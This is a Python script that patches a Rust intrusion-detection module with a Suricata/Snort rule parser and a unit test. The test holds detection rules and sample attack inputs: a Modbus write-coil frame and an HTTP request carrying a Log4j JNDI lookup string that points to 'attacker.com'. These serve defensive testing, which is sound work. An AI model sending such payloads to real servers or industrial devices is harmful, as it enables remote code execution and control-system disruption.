with open("src-tauri/src/threat_detector.rs", "r", encoding="utf-8") as f:
    text = f.read()

suricata_dsl_impl = """
/// Suricata / Snort 标准兼容规则结构体
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuricataRule {
    pub sid: u32,
    pub rev: u32,
    pub action: String,
    pub protocol: String,
    pub src_ip: String,
    pub src_port: String,
    pub dst_ip: String,
    pub dst_port: String,
    pub msg: String,
    pub pattern: Vec<u8>,
    pub nocase: bool,
    pub severity: ThreatSeverity,
    pub category: ThreatCategory,
}

/// 解析 Suricata content 属性 (支持 ASCII 字符串与十六进制管道 |AA BB CC| 混合模式)
pub fn parse_suricata_content(content_str: &str) -> Result<Vec<u8>, String> {
    let mut bytes = Vec::new();
    let mut in_hex = false;
    let mut hex_buf = String::new();

    let trimmed = if content_str.starts_with('"') && content_str.ends_with('"') && content_str.len() >= 2 {
        &content_str[1..content_str.len()-1]
    } else {
        content_str
    };

    let chars: Vec<char> = trimmed.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let ch = chars[i];
        if ch == '|' {
            if in_hex {
                // 结束十六进制解析
                let hex_clean = hex_buf.replace(' ', "");
                let decoded = hex::decode(&hex_clean)
                    .map_err(|e| format!("Suricata content 中的十六进制管道语法无效 '{}': {}", hex_clean, e))?;
                bytes.extend_from_slice(&decoded);
                hex_buf.clear();
                in_hex = false;
            } else {
                in_hex = true;
            }
        } else if in_hex {
            hex_buf.push(ch);
        } else {
            bytes.push(ch as u8);
        }
        i += 1;
    }

    if in_hex {
        return Err("Suricata content 缺少闭合管道符 '|'".to_string());
    }

    Ok(bytes)
}

/// 解析单条 Suricata / Snort 格式的规则文本
/// 语法格式: alert <proto> <src> <src_port> -> <dst> <dst_port> (msg:"..."; content:"..."; sid:123; ...)
pub fn parse_suricata_rule(line: &str) -> Result<SuricataRule, String> {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') {
        return Err("空行或注释行".to_string());
    }

    // 分离头部 (Header) 与选项块 (Options in parentheses)
    let open_paren = trimmed.find('(').ok_or("Suricata 规则缺少参数体起始括号 '('")?;
    let close_paren = trimmed.rfind(')').ok_or("Suricata 规则缺少参数体闭合括号 ')'")?;

    let header_part = trimmed[..open_paren].trim();
    let opts_part = &trimmed[open_paren+1..close_paren];

    let header_tokens: Vec<&str> = header_part.split_whitespace().collect();
    if header_tokens.len() < 7 {
        return Err(format!("Suricata 规则头部格式无效 (预期至少7个词元): '{}'", header_part));
    }

    let action = header_tokens[0].to_lowercase();
    let protocol = header_tokens[1].to_uppercase();
    let src_ip = header_tokens[2].to_string();
    let src_port = header_tokens[3].to_string();
    // header_tokens[4] is "->"
    let dst_ip = header_tokens[5].to_string();
    let dst_port = header_tokens[6].to_string();

    let mut msg = "Suricata Alert Rule".to_string();
    let mut pattern = Vec::new();
    let mut sid = 100000;
    let mut rev = 1;
    let mut nocase = false;
    let mut severity = ThreatSeverity::High;
    let mut category = ThreatCategory::IcsDisruption;

    // 解析分号隔开的各个 Option
    for opt in opts_part.split(';') {
        let opt_trimmed = opt.trim();
        if opt_trimmed.is_empty() {
            continue;
        }

        if let Some((k, v)) = opt_trimmed.split_once(':') {
            let key = k.trim().to_lowercase();
            let val = v.trim();
            match key.as_str() {
                "msg" => {
                    msg = val.trim_matches('"').to_string();
                }
                "content" => {
                    pattern = parse_suricata_content(val)?;
                }
                "sid" => {
                    sid = val.parse::<u32>().unwrap_or(100000);
                }
                "rev" => {
                    rev = val.parse::<u32>().unwrap_or(1);
                }
                "metadata" | "meta" => {
                    let meta_lower = val.to_lowercase();
                    if meta_lower.contains("critical") {
                        severity = ThreatSeverity::Critical;
                    } else if meta_lower.contains("medium") {
                        severity = ThreatSeverity::Medium;
                    } else if meta_lower.contains("low") {
                        severity = ThreatSeverity::Low;
                    }

                    if meta_lower.contains("exploit") {
                        category = ThreatCategory::ExploitPayload;
                    } else if meta_lower.contains("malware") || meta_lower.contains("c2") {
                        category = ThreatCategory::MalwareC2;
                    } else if meta_lower.contains("abuse") {
                        category = ThreatCategory::ProtocolAbuse;
                    }
                }
                _ => {}
            }
        } else if opt_trimmed.eq_ignore_ascii_case("nocase") {
            nocase = true;
        }
    }

    if pattern.is_empty() {
        return Err("Suricata 规则必须包含非空的 content 特征".to_string());
    }

    Ok(SuricataRule {
        sid,
        rev,
        action,
        protocol,
        src_ip,
        src_port,
        dst_ip,
        dst_port,
        msg,
        pattern,
        nocase,
        severity,
        category,
    })
}

/// 批量加载 Suricata 规则文本内容，动态编译并挂载入 Aho-Corasick 检测器
pub fn load_suricata_rules_dsl(
    rules_content: &str,
    automaton: &mut AhoCorasickAutomaton,
) -> Result<usize, String> {
    let mut count = 0;
    for line in rules_content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        match parse_suricata_rule(trimmed) {
            Ok(rule) => {
                automaton.add_signature(ThreatSignature {
                    id: rule.sid,
                    name: rule.msg.clone(),
                    category: rule.category,
                    severity: rule.severity,
                    pattern: rule.pattern,
                    description: format!("Suricata SID:{} Rev:{} Proto:{} Msg:{}", rule.sid, rule.rev, rule.protocol, rule.msg),
                });
                count += 1;
            }
            Err(e) => {
                // 跳过不合规行，但记录非致命解析日志
                if !e.contains("空行") {
                    println!("[SuricataParser] 跳过规则行: {} ({})", trimmed, e);
                }
            }
        }
    }

    if count > 0 {
        automaton.compile();
    }

    Ok(count)
}
"""

test_suricata = """
    #[test]
    fn test_suricata_dsl_rule_parsing_and_live_detection() {
        // 构造包含 ASCII 与十六进制管道的 Suricata 标准规则文本
        let rules_dsl = r#"
# 工业 SCADA 与 Web 攻击特征集合
alert tcp any any -> any 502 (msg:"Modbus Force Single Coil Unauthorized Attack"; content:"|00 00 00 00 00 06 01 05|"; sid:500001; rev:1; metadata:severity critical, category ics_disruption;)
alert tcp any any -> any 80 (msg:"Log4j JNDI Exploit String"; content:"${jndi:ldap://"; nocase; sid:500002; rev:2; metadata:severity critical, category exploit_payload;)
        "#;

        let mut automaton = AhoCorasickAutomaton::new();
        let loaded = load_suricata_rules_dsl(rules_dsl, &mut automaton).unwrap();
        assert_eq!(loaded, 2);

        // 1. 验证 Modbus 十六进制规则命中
        let modbus_attack_frame = vec![
            0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x01, 0x05, 0x00, 0x01, 0xFF, 0x00
        ];
        let hits1 = automaton.scan(&modbus_attack_frame);
        assert_eq!(hits1.len(), 1);
        assert_eq!(hits1[0].signature_id, 500001);
        assert_eq!(hits1[0].name, "Modbus Force Single Coil Unauthorized Attack");
        assert_eq!(hits1[0].severity, "CRITICAL");

        // 2. 验证 Log4j ASCII 规则命中
        let http_payload = b"GET /login?user=${jndi:ldap://attacker.com/a} HTTP/1.1\\r\\n\\r\\n";
        let hits2 = automaton.scan(http_payload);
        assert_eq!(hits2.len(), 1);
        assert_eq!(hits2[0].signature_id, 500002);
        assert_eq!(hits2[0].name, "Log4j JNDI Exploit String");
    }
"""

text_lf = text.replace("\r\n", "\n")
marker = "/// Aho-Corasick 自动机节点\n#[derive(Debug, Clone)]\nstruct AcNode {"
assert marker in text_lf
text_lf = text_lf.replace(marker, suricata_dsl_impl + "\n" + marker, 1)

last_brace = text_lf.rfind("}")
assert last_brace != -1
text_lf = text_lf[:last_brace] + test_suricata + "\n}\n"

with open("src-tauri/src/threat_detector.rs", "w", encoding="utf-8") as f:
    f.write(text_lf)

print("Added Suricata DSL parser and integration tests successfully.")
